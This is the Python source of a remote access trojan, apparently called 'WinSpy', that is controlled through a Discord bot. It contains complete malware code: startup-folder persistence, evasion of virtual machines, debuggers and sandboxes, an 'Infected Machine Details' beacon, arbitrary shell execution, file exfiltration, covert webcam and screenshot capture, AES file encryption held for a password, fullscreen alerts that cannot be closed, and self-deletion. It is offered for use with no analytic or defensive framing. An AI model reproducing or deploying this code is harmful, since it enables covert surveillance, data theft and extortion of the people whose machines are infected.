import discord 
import os
import subprocess
import cv2
import tkinter as tk
from tkinter import messagebox
import sys
import pyautogui
from datetime import datetime
from Cryptodome.Cipher import AES
from Cryptodome.Protocol.KDF import PBKDF2
import socket
import time
import psutil
import ctypes
import platform
from pynput import keyboard
from browser_history import get_history

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

current_time = datetime.now().strftime("%Y-%M-%D %H-%M-%S")

TOKEN = 'TOKEN DISCORD BOT HERE'

blacklist_keywords = [
    'virtualbox',
    'enterprise',
    'vmware'
]

def specsCheck():
    ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
    if int(ram) <= 3:
        sys.programExit()
    disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
    if int(disk) <= 50:
        sys.programExit()
    if int(psutil.cpu_count()) <= 1:
        sys.programExit()

def show_alert(message):
    root = tk.Tk()
    root.title("ALERT")
    
    # Imposta la finestra a schermo intero
    root.attributes("-fullscreen", True)
    root.configure(background='black')  # Sfondo nero
    
    # Disabilita la possibilità di chiudere o ridimensionare la finestra
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    # Imposta il messaggio
    label = tk.Label(root, text=message, fg="red", bg="black", font=("Helvetica", 50))
    label.pack(expand=True)

def show_messagebox(message):
    root = tk.Tk()
    root.withdraw()
    
    root.attributes("-topmost", True)
    root.grab_set_global()
    
    messagebox.showinfo("WinSpy", message)
    
    root.grab_release()
    root.destroy()

def no_vm():
    os_name = platform.system().lower()
    
    domain_name = os.environ.get('USERDOMAIN', '').lower()
    
    machine_name = platform.node().lower()
    
    for keyword in blacklist_keywords:
        if keyword in domain_name or keyword in machine_name or keyword in os_name:
            return True
    
    return False

def is_vm():
    vm_indicators = [
        'virtualbox',
        'vbox',
        'vmware',
        'qemu',
        'xen',
        'hyper-v'
    ]
    
    try:
        output = subprocess.check_output("wmic baseboard get manufacturer", shell=True).decode()
        for indicator in vm_indicators:
            if indicator in output.lower():
                return True
            else:
                return False
    except Exception as e:
        return False

def make_persistent():
    try:
        file_path = os.path.abspath(sys.argv[0])
        
        startup_folder = f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
        bat_file_path = os.path.join(startup_folder, 'start_bot.bat')
        
        bat_content = f'@echo off\npythonw.exe -u "{file_path}"\nexit\n'
        
        if not os.path.exists(bat_file_path):
            with open(bat_file_path, 'w') as bat_file:
                bat_file.write(bat_content)
        else:
            with open(bat_file_path, 'w') as bat_file:
                bat_file.write(bat_content)
    except Exception as e:
        print(" ")

def wait_for_internet_connection():
    while True:
        try:
            socket.gethostbyname("www.google.com")
            print("Internet connection intercepted")
            return
        except socket.gaierror:
            print("Connection not intercepted. Waiting...")
            time.sleep(5)

def generate_key_from_password(password):
    salt = b'\x00' * 16
    key = PBKDF2(password, salt, dkLen=32, count=1000000)
    return key

def encrypt_file(file_path, password):
    key = generate_key_from_password(password)
    cipher = AES.new(key, AES.MODE_EAX)
    with open(file_path, 'rb') as f:
        plaintext = f.read()
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    with open(file_path + ".enc", 'wb') as f:
        [f.write(x) for x in (cipher.nonce, tag, ciphertext)]
    os.remove(file_path)

def decrypt_file(file_path, password):
    key = generate_key_from_password(password)
    with open(file_path, 'rb') as f:
        nonce, tag, ciphertext = [f.read(x) for x in (16, 16, -1)]
    cipher = AES.new(key, AES.MODE_EAX, nonce)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    with open(file_path[:-4], 'wb') as f:
        f.write(plaintext)
    os.remove(file_path)

def tiny_debugger_protection():
    return ctypes.windll.kernel32.IsDebuggerPresent() != 0

@client.event
async def on_ready():
    make_persistent()

    for guild in client.guilds:
        channel = guild.text_channels[0]
        await channel.send(f"\n```--------------------------------\nInfected Machice Details:\nInfected at: {current_time}\nPlatform: {platform.platform()}\nUsername: {os.getlogin()}\n--------------------------------```\n")

@client.event
async def on_message(message):
#    if message.author.id != AUTHORIZED_USER_ID:
#        return  # Ignre message from unhautorized users

    if message.content.startswith('dir'):
        output = subprocess.getoutput('dir')
        await message.channel.send(f"```\n{output}\n```")
        
    elif message.content.startswith('cd '):
        directory = message.content[3:].strip()
        try:
            os.chdir(directory)
            await message.channel.send(f"Directory changed in {os.getcwd()}")
        except FileNotFoundError:
            await message.channel.send("Directory not found.")
        
    elif message.content == "destroy":
        emergency = sys.argv[0]
        with open("deleter.py", 'w') as file:
            file.write(r"""import os
import sys
file_to_remove = sys.argv[1]
                       
os.remove(file_to_remove)""")
        os.system(f"python.exe deleter.py {emergency} && python.exe deleter.py deleter.py")
        await message.channel.send("Client destroyed.")
    elif message.content.startswith("exec "):
        command = message.content[5:]
        try:
            output = subprocess.getoutput(command)
            await message.channel.send(f"```\n{output}\n```")
        except Exception as e:
            await message.channel.send(" ")
    
    elif message.content.startswith("message "):
        text_to_display = message.content[len('message '):]
        show_messagebox(text_to_display)
        await message.channel.send(f"message '{text_to_display}' viewed.")
    
    elif message.content == "ping":
        await message.channel.send("pong")
        
    elif message.content == "whoami":
        system = platform.platform()
        c_cwd = os.getcwd()
        hostname_attual = os.getlogin()
        await message.channel.send(f"System: {system}\nCurrent Directory: {c_cwd}\nHostname: {hostname_attual}\n")
    
    elif message.content.startswith("download "):
        filename_to_download = message.content[len('download '):].strip()
        if os.path.isfile(filename_to_download):
            await message.channel.send(file=discord.File(filename_to_download))
            await message.channel.send(f"File '{filename_to_download} downloaded!")
        else:
            await message.channel.send(f"File '{filename_to_download} non trovato.")
    elif message.content.startswith("webcam"):
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            cv2.imwrite(f"C:/Users/{os.getlogin()}/Documents/webcam.png", frame)
            await message.channel.send(file=discord.File(f"C:/Users/{os.getlogin()}/Documents/webcam.png"))
        else:
            cam.release()
            await message.channel.send("Webcam not found.")
        if os.path.exists("webcam.png"):
            os.remove("webcam.png")
    elif message.content.startswith("screenshot"):
        screenshot = pyautogui.screenshot()
        screenshot_path = f"C:/Users/{os.getlogin()}/Documents/screenshot.png"
        
        screenshot.save(screenshot_path)
        
        await message.channel.send(file=discord.File(screenshot_path))
        if os.path.exists(screenshot_path):
            os.remove(screenshot_path)
    
    if message.content.startswith("encrypt "):
        try:
            _, file_path, password = message.content.split(' ')
            encrypt_file(file_path, password)
            await message.channel.send(f"File '{file_path}' succesfully encrypted.")
        except Exception as e:
            await message.channel.send(f"Error during the ecnryption of the file: {e}")
    
    elif message.content.startswith("decrypt "):
        try:
            _, file_path, password = message.content.split(' ')
            decrypt_file(file_path, password)
            await message.channel.send(f"File '{file_path}' successfully decrypted.")
        except Exception as e:
            await message.channel.send(f"Error during the decryption of file: {e}")
    
    elif message.content.startswith("alert "):
        alert_message = message.content[len("alert "):].strip()
        show_alert(alert_message)
        await message.channel.send(f"Message showed: {alert_message}")
    
if no_vm() or is_vm() or tiny_debugger_protection():
    sys.exit(1)
else:
    specsCheck()    
    wait_for_internet_connection()
    client.run(TOKEN)